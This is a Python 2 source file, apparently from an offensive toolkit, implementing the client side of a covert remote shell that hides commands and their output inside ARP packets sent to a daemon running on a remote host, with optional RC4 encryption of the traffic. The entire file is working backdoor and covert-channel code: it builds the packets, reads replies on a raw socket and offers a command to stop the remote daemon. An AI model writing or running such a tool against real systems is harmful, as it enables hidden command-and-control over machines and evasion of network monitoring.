from scapy.all import *
from struct import unpack
from threading import Thread
from parameter import Parameter
from time import sleep
from getpass import getpass
import zcrypto
import util

""" slarpc implements the client portion
	of the ARP shell.  slarpd should be running
	on a remote host before invoking.  Basic encryption
	is supported using RC4.  TODO would be a DH exchange.

	Two caveats with this: you'll need root on the remote
	server, and because Python is userland, you'll see two
	ARP responses per ARP packet.

	Enter "slarp-shutdown" to kill the remote daemon or just
	"exit" to end the shell.
"""
class slarpc(Parameter):
	def __init__(self):
		conf.verb = 0
		self.remote_host = None
		
		self.encrypt = False
		self.rc4 = None
		super(slarpc,self).__init__('ARP Shell')

	def sender_ip(self,data):
		"""Unpack the source IP address"""
		ip = unpack('!4s',data[28:32])
		return socket.inet_ntoa(ip[0])

	def receive(self):
		"""Receive ARP packets on a raw socket"""
		try:
			sock = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0806))	
			while True:
				data = sock.recv(1024)
				if self.sender_ip(data) == self.remote_host and data[42] != '\x00':
					if self.encrypt: data = self.rc4.decrypt(data[42:].replace('\x00',''))
					else: data = data[42:].replace('\x00','')
					print data
					return
		except Exception,e:
			util.Error(e)

	def send(self, cmd):
		"""Send the command to the remote host"""
		try:
			if self.encrypt: cmd = self.rc4.encrypt(cmd)
			pkt = Ether()/ARP(pdst=self.remote_host)
			pkt /= cmd 
			sendp(pkt,count=1)
		except Exception, e:
			util.Error(e)
	
	def shell(self):
		"""Implements the shell"""
		while True:
			cmd = raw_input("# ")
			if cmd == 'exit':
				# exit shell
				break
			elif cmd == 'slarp-shutdown':
				# shutdown remote daemon and exit
				self.send('3')
				break
			elif len(cmd) <= 1:
				continue

			# packets come quick, so we need to start listening first
			tmp = Thread(target=self.receive)
			tmp.start()
			self.send('1'+cmd)
			sleep(.25)

	def initialize_crypto(self):			
		"""Initialize RC4"""
		self.rc4 = zcrypto.RC4()
		self.rc4.key = getpass('[!] Enter encryption password: ')

	def initialize(self):
		"""Fetch remote host and perform any encryption
		   runtime generation.
		"""
		util.Msg('The slarpd daemon should be running on the remote host!')

		while True:
			try:
				tmp = raw_input('[!] Remote host: ')
				if len(tmp.split('.')) is 4:
					self.remote_host = tmp

				tmp = raw_input('[!] Encrypt traffic? ')
				if not 'n' in tmp.lower():
					self.initialize_crypto()
					util.Msg('Traffic encrypted.')
					self.encrypt = True
				break
			except Exception, e: 
				util.Error(e)
		util.Msg('Spawning remote shell to %s'%(self.remote_host))
		self.shell()
